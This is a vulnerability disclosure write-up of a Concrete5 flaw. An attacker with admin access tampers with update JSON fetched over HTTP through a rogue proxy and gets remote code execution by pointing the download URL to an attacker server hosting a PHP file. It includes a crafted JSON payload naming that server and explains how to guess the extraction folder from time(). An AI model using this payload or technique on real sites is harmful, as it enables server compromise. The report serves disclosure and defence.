# HTTP Update JSON Scheme Tampering Leading to Remote Code Execution in Concrete5

## Metadata
- **Source:** HackerOne
- **Report:** 982130 | https://hackerone.com/reports/982130
- **Submitted:** 2020-09-14
- **Reporter:** pabl00nicarres
- **Program:** Concrete5
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Man-in-the-Middle (MITM), Insecure Deserialization, Arbitrary File Upload, Remote Code Execution, Insufficient Input Validation
- **CVEs:** CVE-2021-40099
- **Category:** memory-binary

## Summary
Concrete5 fetches update JSON schema over unencrypted HTTP, allowing attackers to tamper with the update URL and inject malicious code. Combined with the ability to set arbitrary proxies and predictable directory naming based on PHP's time() function, an authenticated administrator can achieve remote code execution by downloading and extracting a crafted malicious ZIP file.

## Attack scenario
1. Attacker gains administrator credentials or compromises an admin account
2. Attacker configures a malicious proxy in Concrete5 settings pointing to attacker-controlled infrastructure
3. Attacker intercepts the HTTP request to www.concrete5.org for update JSON and modifies the response to point the direct_download_url to attacker's server
4. Administrator initiates update check and sees the attacker-crafted version as available
5. Administrator clicks download, and the malicious ZIP file is fetched from attacker's server
6. The application extracts the ZIP to a predictable directory (guessable via time() function matching ccm_token generation) and attacker accesses the uploaded PHP shell via web root

## Root cause
Multiple compounding security issues: (1) Update JSON fetched over HTTP instead of HTTPS, enabling MITM attacks; (2) No integrity verification of downloaded update packages; (3) Predictable directory naming using PHP's time() function; (4) Arbitrary proxy configuration allowed for administrators; (5) Insufficient validation of update URLs and package contents; (6) Extracted files directly accessible from web root

## Attacker mindset
An attacker with admin access seeks to escalate to RCE through legitimate update mechanisms. The attacker exploits the HTTP channel to inject malicious content and leverages predictable timing functions to reliably locate uploaded files. The approach is methodical: intercept, tamper, predict, and execute.

## Defensive takeaways
- Always use HTTPS for all communications, especially for critical functions like update delivery
- Implement cryptographic signature verification on all downloaded packages using public key infrastructure
- Use cryptographically secure random number generation for sensitive values (file paths, tokens) instead of time()-based functions
- Restrict proxy configuration to non-administrative users or implement strict proxy validation
- Implement Content Security Policy and restrict execution of uploaded files outside designated safe directories
- Validate and sanitize all URLs in update JSON before use
- Store extracted updates outside the web root and use a loader mechanism to serve them
- Log all update checks and downloads with detailed audit trails
- Implement rate limiting on update checks to detect suspicious activity

## Variant hunting
Look for similar patterns in other CMS platforms (WordPress, Drupal, Joomla) that fetch updates over HTTP; examine any application that uses time()-based directory naming; review proxy configuration options in admin panels; test update mechanisms in embedded systems and legacy software; audit other uses of time() for security-critical operations

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1557 - Man-in-the-Middle
- T1547 - Boot or Logon Autostart Execution
- T1570 - Lateral Tool Transfer
- T1105 - Ingress Tool Transfer
- T1203 - Exploitation for Client Execution

## Notes
Report includes magic word 'crayons'. The vulnerability requires administrator privileges but represents significant risk in shared hosting or compromised admin scenarios. The time() function exploitation is particularly clever as it ties two separate functions together. Concrete5 should have enforced HTTPS for all remote communications regardless of admin-enabled proxies.

## Full report
<details><summary>Expand</summary>

Hi,
I noticed that concrete5 fetches the update JSON scheme from www.concrete5.org over HTTP.
The fetched json defines the download URL, so we can simply tamper with this JSON in order to make the update URL point to a server controlled by us.
Combining this with the possibility to set an arbitrary proxy for outgoing communications leads to RCE.

Privileges required: Administrator
Preconditions: the directory "updates" has to be writable from the application. 
Magic word for submitting the report: crayons

Here the steps to reproduce:

- Login with a user with Administrator privileges.
- Set the proxy to an attacker controlled proxy (here I used a Burp instance for the sake of simplicity).
{F987848}
- Write proxy rules to modify both request and answer. With Burp this comes trivial, I used the "match and replace" functionality. 

{F987845}

Here I explain the rules:
The first rule replaces the actual version "8.5.4" with version 8, so we can obtain a response from concrete5 with a valid json to  tamper with.
The second rule changes the json field "Direct Download URL" with an arbitrary host controlled by the attacker.
The third rule changes the json field "version" to a new version, to bypass the internal control logic making the application to believe there's a new update available.
Of course, we could simply provide a crafted json in the response, like this:

```
{"version":"8.6","notes":"RCE","notes_url":"https:\/\/documentation.concrete5.org\/developers\/background\/version-history\/821-release-notes","identifier":"8.6","date":"2017-08-02","direct_download_url":"http:\/\/192.168.1.170:8000\/test.zip"}
```

- Set a webserver with a zipped file. Here I used test.zip, which contains the file "poc.php".
- Perform the update check letting our proxy tamper with request/answer and then click on the download button.
- Verify that our fake update has been downloaded from our rogue server, successfully unzipped and is reachable from the web root (in the example below I downloaded it multiple times).
{F987864}
{F987866}
- The only issue in this procedure is that the application writes the unzipped update in a directory and the name of this directory is generated by the PHP native function time().
{F987869}

It could be easy to guess this value for an attacker but still pretty annoying, iterating over a number of values.
Luckily for us the application token "ccm_token" is generated using the very same "time()" function.
We can just perform an unauthenticated request (or whatever request returns the aforementioned token in a web page) knowing the time function output in that moment.
{F987876}
Doing this, an attacker just needs to perform 2 or 3 requests for nearby time values in order to guess the name of the folder,  making this completely reliable from the attacker perspective.

Thanks
Paolo Serracino

## Impact

Remote Code Execution

</details>

---
*Analysed by Claude on 2026-05-12*
